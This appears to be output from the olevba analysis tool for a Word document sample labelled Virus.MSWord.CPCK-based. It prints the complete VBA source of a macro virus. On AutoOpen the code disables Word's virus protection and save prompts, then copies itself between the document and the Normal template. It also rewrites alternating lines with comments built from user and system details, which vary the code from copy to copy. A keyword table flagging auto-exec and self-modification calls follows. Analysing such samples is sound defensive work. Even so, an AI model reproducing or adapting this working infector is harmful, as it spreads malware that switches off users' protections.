olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.CPCK-based-a55e90e8357f9d37280eba67782d5c7cde2622ca
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.CPCK-based-a55e90e8357f9d37280eba67782d5c7cde2622ca - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
'TesterTtest.doctest.doc2/23/01 6:01:01 PM
On Error Resume Next
'TesterTtest.doctest.doc2/23/01 6:01:01 PM
Options.SaveNormalPrompt = 0
'TesterTtest.doctest.doc2/23/01 6:01:01 PM
Options.VirusProtection = 0
'TesterTtest.doctest.doc2/23/01 6:01:01 PM
TD78 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
'TesterTtest.doctest.doc2/23/01 6:01:01 PM
Application.EnableCancelKey = 0
'TesterTtest.doctest.doc2/23/01 6:01:01 PM
TV70 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
'TesterTtest.doctest.doc2/23/01 6:01:01 PM
Options.ConfirmConversions = 0
'TesterTtest.doctest.doc2/23/01 6:01:01 PM
If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Sub" Then
'TesterTtest.doctest.doc2/23/01 6:01:01 PM
Set MU43 = ActiveDocument.VBProject.VBComponents.Item(1)
'TesterTtest.doctest.doc2/23/01 6:01:01 PM
FD98 = True
'TesterTtest.doctest.doc2/23/01 6:01:01 PM
End If
'TesterTtest.doctest.doc2/23/01 6:01:01 PM
If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Sub" Then
'TesterTtest.doctest.doc2/23/01 6:01:01 PM
Set MU43 = NormalTemplate.VBProject.VBComponents.Item(1)
'TesterTtest.doctest.doc2/23/01 6:01:01 PM
DG58 = True
'TesterTtest.doctest.doc2/23/01 6:01:01 PM
End If
'TesterTtest.doctest.doc2/23/01 6:01:01 PM
If DG58 <> True And FD98 <> True Then GoTo HS96
'TesterTtest.doctest.doc2/23/01 6:01:01 PM
If DG58 = True Then MU43.CodeModule.AddFromString ("Sub AutoClose()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, TV70 - 1))
'TesterTtest.doctest.doc2/23/01 6:01:01 PM
If FD98 = True Then MU43.CodeModule.AddFromString ("Sub AutoOpen()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, TD78 - 1))
'TesterTtest.doctest.doc2/23/01 6:01:01 PM
With MU43.CodeModule
'TesterTtest.doctest.doc2/23/01 6:01:01 PM
For x = 2 To (MU43.CodeModule.CountOfLines - 1) Step 2
'TesterTtest.doctest.doc2/23/01 6:01:01 PM
.replaceline x, "'" & Application.UserName & Application.UserInitials & Application.ActiveWindow & Application.ActiveDocument & Application.ActivePrinter & Now
'TesterTtest.doctest.doc2/23/01 6:01:01 PM
Next x
'TesterTtest.doctest.doc2/23/01 6:01:01 PM
End With
'TesterTtest.doctest.doc2/23/01 6:01:01 PM
HS96:
'TesterTtest.doctest.doc2/23/01 6:01:01 PM
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

